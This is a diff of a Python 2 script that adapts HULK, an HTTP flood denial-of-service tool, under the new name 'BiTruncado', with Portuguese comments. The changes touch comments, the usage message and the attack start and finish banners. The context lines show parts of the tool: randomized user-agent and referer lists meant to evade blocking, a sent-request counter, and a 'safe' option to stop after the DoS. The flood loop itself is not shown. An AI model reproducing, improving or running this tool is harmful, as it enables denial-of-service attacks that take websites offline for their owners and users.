@@ -1,10 +1,9 @@
-
+#! /usr/bin/env python
 #----------------------------------------------------------------------------------------------
-# Esse Código e uma adptação do codigo  HULK - HTTP Unbearable Load King
-# author :  Barry Shteiman , version 1.0
-# Nova Version BiTruncado
-#  - Atakk a varios agentes WeB
-#  - Portas Melhoradas
+#Modificacao do codigo 
+#HULK - HTTP Unbearable Load King 
+#author :  Barry Shteiman , version 1.0
+#Nova Versao autores: Rafael Viana | Ramon 
 # ----------------------------------------------------------------------------------------------
 import urllib2
 import sys
@@ -33,7 +32,6 @@ def set_safe():
 	global safe
 	safe=1
 	
-# Gera uma lista de Agentes (Navegadores), para tentar dificultar na negação de alocação de requisição
 def useragent_list():
 	global headers_useragents
 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
@@ -50,7 +48,7 @@ def useragent_list():
 	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
 	return(headers_useragents)
 
-# Gera uma Lista 
+#Gera uma Lista 
 def referer_list():
 	global headers_referers
 	headers_referers.append('http://www.google.com/?q=')
@@ -69,8 +67,8 @@ def buildblock(size):
 
 def usage():
 	print '---------------------------------------------------'
-	print 'Para usar: python BiTruncado.py <url>'
-	# print 'you can add "safe" after url, to autoshut after dos'
+	print 'USAGE: python hulk.py <url>'
+	print 'you can add "safe" after url, to autoshut after dos'
 	print '---------------------------------------------------'
 
 	
@@ -127,7 +125,7 @@ class MonitorThread(threading.Thread):
 				print "%d Requests Sent" % (request_counter)
 				previous=request_counter
 		if flag==2:
-			print "\n-- BiTruncado Attack Finished --"
+			print "\n-- BiTruncado Attack Terminado --"
 
 #execute 
 if len(sys.argv) < 2:
@@ -138,7 +136,7 @@ else:
 		usage()
 		sys.exit()
 	else:
-		print "-- HULK Attack Started --"
+		print "-- BiTruncado Force Ativado --"
 		if len(sys.argv)== 3:
 			if sys.argv[2]=="safe":
 				set_safe()
